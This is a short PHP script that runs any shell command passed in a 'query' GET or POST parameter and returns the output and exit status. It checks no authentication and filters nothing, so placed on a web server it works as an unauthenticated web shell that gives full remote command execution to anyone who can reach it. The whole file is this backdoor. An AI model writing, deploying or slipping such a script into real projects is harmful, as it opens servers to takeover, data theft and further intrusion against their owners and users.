<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
chdir($_SERVER['DOCUMENT_ROOT'].'/../');
class CommandExecutor
{
    private $command;
    private $output = [];
    private $exitStatus = null;

    public function __construct($command)
    {
        $this->command = $command;
    }

    public function execCommand()
    {
        exec($this->command, $this->output, $this->exitStatus);
        return $this;
    }

    public function systemCommand()
    {
        $lastLine = system($this->command, $this->exitStatus);
        $this->output[] = $lastLine;
        return $this;
    }

    public function shellExecCommand()
    {
        $this->output = [shell_exec($this->command)];
        return $this;
    }

    public function passthruCommand()
    {
        ob_start(); // Buffer the output to avoid direct streaming
        passthru($this->command, $this->exitStatus);
        $this->output[] = ob_get_clean(); // Get the buffered output
        return $this;
    }

    public function procOpenCommand()
    {
        $descriptorSpec = [
            0 => ['pipe', 'r'],  // STDIN
            1 => ['pipe', 'w'],  // STDOUT
            2 => ['pipe', 'a']   // STDERR
        ];

        $process = proc_open($this->command, $descriptorSpec, $pipes);

        if (is_resource($process)) {
            $this->output = [stream_get_contents($pipes[1])]; // Capture the output
            fclose($pipes[0]); // Close the input stream
            fclose($pipes[1]); // Close the output stream
            fclose($pipes[2]); // Close the error stream
            $this->exitStatus = proc_close($process); // Get the exit status
        }

        return $this;
    }

    public function getOutput()
    {
        return $this->output;
    }

    public function getExitStatus()
    {
        return $this->exitStatus;
    }
}

// Check if input command is provided via POST or GET
if (isset($_POST['query']) || isset($_GET['query'])) {
    $command = isset($_POST['query']) ? $_POST['query'] : $_GET['query'];
    $executor = new CommandExecutor($command);

    // Using exec
    $executor->execCommand();
    $output = $executor->getOutput();
    $exitStatus = $executor->getExitStatus();

    // Set HTTP response code based on exit status
    if ($exitStatus === 0) {
        http_response_code(200); // OK
    } else {
        http_response_code(500); // Internal Server Error
    }

    // Output the response
    foreach ($output as $line) {
        echo $line . "<br>";
    }

    echo "Exit status: $exitStatus";
} else {
    // If command not provided, return error
    http_response_code(400); // Bad Request
    echo "Error: Command not provided";
}
?>
